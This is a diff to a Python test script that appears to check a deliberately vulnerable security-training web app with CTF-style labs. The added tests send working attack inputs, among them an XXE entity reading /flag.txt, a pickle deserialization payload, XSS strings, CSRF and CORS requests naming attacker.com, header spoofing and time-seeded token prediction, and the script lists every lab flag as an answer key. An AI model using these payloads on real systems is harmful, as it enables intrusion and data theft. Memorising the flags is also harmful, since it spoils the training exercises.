@@ -1,4 +1,8 @@
 import asyncio
+import base64
+import pickle
+import time
+import random
 import jwt
 from starlette.testclient import TestClient
 from app.main import app
@@ -27,6 +31,12 @@ def run_all_tests():
     assert res.status_code == 200
     assert "FLAG{sqli_union_db_extraction_7719}" in res.text
     print("[+] SQLi UNION Exfiltration: OK")
+
+    print("[*] Testing SQLi Blind...")
+    res = client.get("/labs/sqli/check-user?username=system_flag")
+    assert res.status_code == 200
+    assert res.json().get("exists") is True
+    print("[+] SQLi Blind Inference: OK")
 
     print("[*] Testing XSS Reflected...")
     res = client.get("/labs/xss?q=<script>alert(1)</script>")
@@ -103,10 +113,89 @@ def run_all_tests():
     assert "FLAG{race_condition_toctou_balance_glitch_4011}" in res_buy.text
     print("[+] Race Condition TOCTOU Balance Glitch & Flag Purchase: OK")
 
-    print("[*] Verifying Flag Submission Engine for all 12 flags...")
+    print("[*] Testing XXE Injection...")
+    xxe_payload = """<?xml version="1.0"?>
+    <!DOCTYPE data [
+    <!ENTITY xxe SYSTEM "file:///flag.txt">
+    ]>
+    <order><item>&xxe;</item></order>"""
+    res = client.post("/labs/xxe/parse", data={"xml_content": xxe_payload})
+    assert res.status_code == 200
+    assert "FLAG{xxe_external_entity_disclosure_7261}" in res.text
+    print("[+] XXE External Entity Disclosure: OK")
+
+    print("[*] Testing Insecure Deserialization (Pickle)...")
+    evil_dict = {"role": "admin", "exploit": True}
+    encoded_p = base64.b64encode(pickle.dumps(evil_dict)).decode()
+    res = client.post("/labs/deserialization/load", data={"payload": encoded_p})
+    assert res.status_code == 200
+    assert "FLAG{insecure_pickle_deserialization_rce_5541}" in res.text
+    print("[+] Insecure Deserialization: OK")
+
+    print("[*] Testing Mass Assignment...")
+    res = client.post("/labs/mass-assignment/profile", data={"username": "student", "role": "admin", "bio": "Exploited"})
+    assert res.status_code == 200
+    assert "FLAG{mass_assignment_privilege_escalation_1289}" in res.text
+    print("[+] Mass Assignment Privilege Escalation: OK")
+
+    print("[*] Testing CSRF State-Changing Operation...")
+    res = client.post("/labs/csrf/change-email", data={"email": "attacker@evil.local"})
+    assert res.status_code == 200
+    assert "FLAG{csrf_state_changing_action_pwned_4431}" in res.text
+    print("[+] CSRF Operation: OK")
+
+    print("[*] Testing Open Redirect...")
+    res = client.get("/labs/redirect?url=https://attacker.com/login")
+    assert res.status_code == 200
+    assert "FLAG{open_redirect_phishing_vector_6021}" in res.text
+    print("[+] Open Redirect: OK")
+
+    print("[*] Testing CORS Misconfiguration...")
+    res = client.get("/labs/cors/api/account-keys", headers={"origin": "https://attacker.com"})
+    assert res.status_code == 200
+    assert res.headers.get("Access-Control-Allow-Origin") == "https://attacker.com"
+    assert "FLAG{cors_arbitrary_origin_credential_leak_3391}" in res.text
+    print("[+] CORS Misconfiguration: OK")
+
+    print("[*] Testing File Upload...")
+    res = client.post("/labs/upload", files={"file": ("exploit.html", b"<html><script>alert(1)</script></html>", "text/html")})
+    assert res.status_code == 200
+    assert "FLAG{unrestricted_file_upload_stored_xss_8820}" in res.text
+    print("[+] File Upload: OK")
+
+    print("[*] Testing Header Spoofing (X-Forwarded-For)...")
+    res = client.get("/labs/headers/admin-panel", headers={"x-forwarded-for": "127.0.0.1"})
+    assert res.status_code == 200
+    assert "FLAG{header_spoofing_client_ip_bypass_4102}" in res.text
+    print("[+] Header Spoofing: OK")
+
+    print("[*] Testing Cryptographic PRNG...")
+    client.post("/labs/crypto/request-reset", data={"email": "admin@academy.local"})
+    t = int(time.time())
+    random.seed(t)
+    pred_token = str(random.randint(100000, 999999))
+    res = client.post("/labs/crypto/verify-token", data={"email": "admin@academy.local", "token": pred_token})
+    assert res.status_code == 200
+    assert "FLAG{weak_prng_predictable_token_7734}" in res.text
+    print("[+] Weak PRNG Prediction: OK")
+
+    print("[*] Testing API BOLA / Field Exposure...")
+    res = client.get("/labs/api-security/api/v1/users/1")
+    assert res.status_code == 200
+    assert "FLAG{bola_api_sensitive_field_exposure_5519}" in res.text
+    print("[+] API Property Exposure: OK")
+
+    print("[*] Testing DOM XSS...")
+    res = client.get("/labs/dom-xss?nickname=<img src=x onerror=alert(1)>")
+    assert res.status_code == 200
+    assert "FLAG{dom_xss_execution_sink_untrusted_source_9918}" in res.text
+    print("[+] DOM XSS: OK")
+
+    print("[*] Verifying Flag Submission Engine for all 24 flags...")
     all_flags = [
         "FLAG{sqli_auth_bypass_login_pwned_8192}",
         "FLAG{sqli_union_db_extraction_7719}",
+        "FLAG{blind_sqli_boolean_extraction_9102}",
         "FLAG{r3fl3ct3d_xss_c00k13_st0l3n_4421}",
         "FLAG{st0r3d_xss_p3rs1st3nt_p4yl04d_5532}",
         "FLAG{xss_stole_admin_cookie}",
@@ -117,6 +206,17 @@ def run_all_tests():
         "FLAG{ssrf_internal_pivot_pwned_9941}",
         "FLAG{ssti_jinja2_template_rce_8812}",
         "FLAG{race_condition_toctou_balance_glitch_4011}",
+        "FLAG{xxe_external_entity_disclosure_7261}",
+        "FLAG{insecure_pickle_deserialization_rce_5541}",
+        "FLAG{mass_assignment_privilege_escalation_1289}",
+        "FLAG{csrf_state_changing_action_pwned_4431}",
+        "FLAG{open_redirect_phishing_vector_6021}",
+        "FLAG{cors_arbitrary_origin_credential_leak_3391}",
+        "FLAG{unrestricted_file_upload_stored_xss_8820}",
+        "FLAG{header_spoofing_client_ip_bypass_4102}",
+        "FLAG{weak_prng_predictable_token_7734}",
+        "FLAG{bola_api_sensitive_field_exposure_5519}",
+        "FLAG{dom_xss_execution_sink_untrusted_source_9918}",
     ]
 
     for f in all_flags:
